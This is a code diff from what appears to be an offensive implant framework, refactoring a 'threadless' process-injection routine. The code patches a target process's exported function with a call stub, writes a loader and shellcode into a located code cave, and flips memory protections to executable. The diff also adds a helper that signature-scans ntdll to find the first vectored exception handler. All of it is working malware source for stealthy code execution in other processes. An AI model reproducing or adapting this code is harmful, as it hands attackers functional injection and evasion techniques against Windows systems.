@@ -10,50 +10,77 @@ namespace Injection {
         // todo: needs MmPivotRegion (Flower) :
         // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]
 
-        HANDLE Proc         = { };
-        ULONG Protect       = 0;
-        UINT_PTR pExport    = 0;
-        UINT_PTR exportCpy  = 0;
-        UINT_PTR pHook      = 0;
-        SIZE_T Write        = 0;
+        HANDLE process      = { };
+        UINT_PTR ex_addr    = 0;
+        UINT_PTR ex_addr_p  = 0;
+        UINT_PTR hook       = 0;
+        SIZE_T write        = 0;
 
-        if (!(pExport   = Memory::LdrGetExport(S_CAST(LPSTR, Threadless.Module.Buffer), R_CAST(LPSTR, Threadless.Export.Buffer))) ||
-            !(Proc      = Process::LdrGetParentHandle(R_CAST(PBYTE, Threadless.Parent.Buffer))) ||
-            !(pHook     = Memory::MmCaveHunter(Proc, R_CAST(LPVOID, pExport), cbShellcode))) {
+        if (!(ex_addr = Memory::Modules::GetExportAddress(S_CAST(LPSTR, Threadless.Module.Buffer), R_CAST(LPSTR, Threadless.Export.Buffer))) ||
+            !(process = Process::LdrGetParentHandle(R_CAST(PBYTE, Threadless.Parent.Buffer))) ||
+            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), cbShellcode))) {
             return;
         }
 
-        auto LoaderRva = pHook - (pExport + 5);
-        auto hookCpy = pHook;
+        auto loader_rva = hook - (ex_addr + 5);
+        auto hook_p = hook;
 
-        MmPatchData(i, R_CAST(PBYTE, &exportCpy), (i), R_CAST(PBYTE, &pExport), (i), sizeof(LPVOID))
-        MmPatchData(i, Threadless.Loader.Buffer, (EXPORT_OFFSET + i), R_CAST(PBYTE, &exportCpy), (i), sizeof(LPVOID))
-        MmPatchData(i, Threadless.Opcode.Buffer, (CALL_X_OFFSET + i), R_CAST(PBYTE, &LoaderRva), (i), 4)
+        Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
+        Memory::PatchMemory(B_PTR(Threadless.Loader.Buffer), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
+        Memory::PatchMemory(B_PTR(Threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, R_CAST(PVOID*, &exportCpy), &cbFullSize, PAGE_EXECUTE_READWRITE, &Protect)) ||
-            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, R_CAST(PVOID, pExport), R_CAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write)) ||
-            Write != Threadless.Opcode.Length) {
-            return;
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &cbFullSize, PAGE_EXECUTE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &write)) || write != Threadless.Opcode.Length) {
+            return_defer(ntstatus);
         }
-
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, R_CAST(LPVOID*, &hookCpy), &cbFullSize, PAGE_READWRITE, &Protect)) ||
-            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
-            Write != Threadless.Loader.Length) {
-            return;
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &cbFullSize, PAGE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), Threadless.Loader.Buffer, Threadless.Loader.Length, &write)) || write != Threadless.Loader.Length) {
+            return_defer(ntstatus);
         }
 
         //Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, cbShellcode, &Write)) || Write != cbShellcode ||
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, R_CAST(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
-            return;
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + Threadless.Loader.Length), Shellcode, cbShellcode, &write)) || write != cbShellcode ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &cbShellcode, PAGE_EXECUTE_READ, nullptr))) {
+            return_defer(ntstatus);
         }
 
-        if (Proc) {
-            Ctx->Nt.NtClose(Proc);
+        defer:
+        if (process) {
+            Ctx->Nt.NtClose(process);
+        }
+    }
+
+    namespace Veh {
+
+        UINT_PTR VehGetFirstHandler(wchar_t *name, const char *signature, const char *mask) {
+            HEXANE
+
+            LdrpVectorHandlerList *handlers = { };
+            uintptr_t handler = { };
+            uint32_t match = 0;
+
+            const auto ntdll = Memory::Modules::GetModuleEntry(Utils::GetHashFromStringW(name, x_wcslen(name)));
+            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, ntdll->DllBase), ntdll->SizeOfImage, signature, mask))) {
+                return_defer(ERROR_INCORRECT_ADDRESS);
+            }
+
+            match += 0xD;
+            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));
+
+            if (
+                !NT_SUCCESS(Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, ntdll)) ||
+                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {
+
+                handler = 0;
+                return_defer(ntstatus);
+            }
+
+            defer:
+            return handler;
         }
     }
 }
